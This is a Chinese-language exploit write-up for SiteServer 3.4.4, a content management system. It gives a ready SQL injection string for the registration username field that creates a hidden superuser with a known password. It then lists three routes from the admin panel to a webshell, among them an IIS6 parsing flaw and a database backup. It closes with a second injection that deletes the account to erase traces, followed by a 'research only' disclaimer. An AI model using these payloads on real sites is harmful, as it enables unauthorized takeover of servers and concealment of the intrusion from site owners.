@@ -1,0 +1,75 @@
+0x01 简介siteserver: 
+
+本文测试的版本是：
+SiteServer系列产品 最新版本: 3.4.4 正式版 (2011年7月18日发布) 
+下载地址：http://www.siteserver.cn/download
+
+客户案例：
+http://www.siteserver.cn/customer
+
+也百度了一下，发现客户数量还是不少的。
+
+
+0x02: 漏洞描述：
+问题出在UserCenter.Pages.DLL中的Register，注册流程逻辑有问题，具体如下：
+
+1.程序先把用户名带入数据库中查询，如果用户名没有重复，进入第二步；
+
+2.再在远程检测用户名中是否含有非法字符，如果没有，则进入第三步；
+
+3.将新注册的用户插入数据库。
+
+ 
+
+由于在进行第一步的时候，程序没有进行任何处理就带入数据库中查询，那么就可以xxoo了。 Orz。。。。 
+
+Example: 
+http://www.shitsec.com/UserCenter/register.aspx
+
+用户名填入以下语句，其他地方正常填写。
+
+123');insert into bairong_Administrator([UserName],[Password],[PasswordFormat],[PasswordSalt]) values('blue','VffSUZcBPo4=','Encrypted','i7jq4LwC25wKDoqHErBWaw==');insert into bairong_AdministratorsInRoles values('Administrator','blue');insert into bairong_AdministratorsInRoles values('RegisteredUser','blue');insert into bairong_AdministratorsInRoles values('ConsoleAdministrator','blue');--
+
+提交注册之后就往库里面插入了一个用户名为：blue 密码为：lanhai 的超级用户。
+
+默认后台地址为：http://www.shitsec.com/siteserver
+
+0x03 后台到webshell：
+
+拿webshell或者直接提权是一个仁者见仁智者见智的活，各家有各家的方法，我大概看了一下，有3种方法-
+
+
+一、
+
+站点管理-》显示功能-》模板管理-》添加单页模板-》直接生成aspx
+
+
+二、
+
+成员权限-》添加用户-》用户名为：1.asp
+
+http://www.shitsec.com/usercenter/
+
+用刚才添加的1.asp去登陆，进去之后上传个人头像，利用IIS6解析漏洞得webshell
+
+（ps：后台添加用户时不会验证是否含有非法字符）
+
+
+三、
+
+系统工具-》实用工具-》机器参数查看
+可以看到数据库类型、名称，WEB路径
+
+系统工具-》数据库工具-》SQL语句查询
+这功能做的不错，直接就相当于一个查询分析器，什么回显都有，可以backup得webshell，或者利用sqlserver配置不当直接XXOO。
+
+ 
+
+0x04 扫尾：
+xxoo完了之后记得到
+http://www.shitsec.com/UserCenter/register.aspx 
+再用
+123');delete bairong_Administrator where UserName='blue';--
+为用户名进行注册，做好痕迹清理工作。
+
+最后，希望siteserver看到之后能及时修补，本文仅作为技术研究之用，请勿用于非法用途
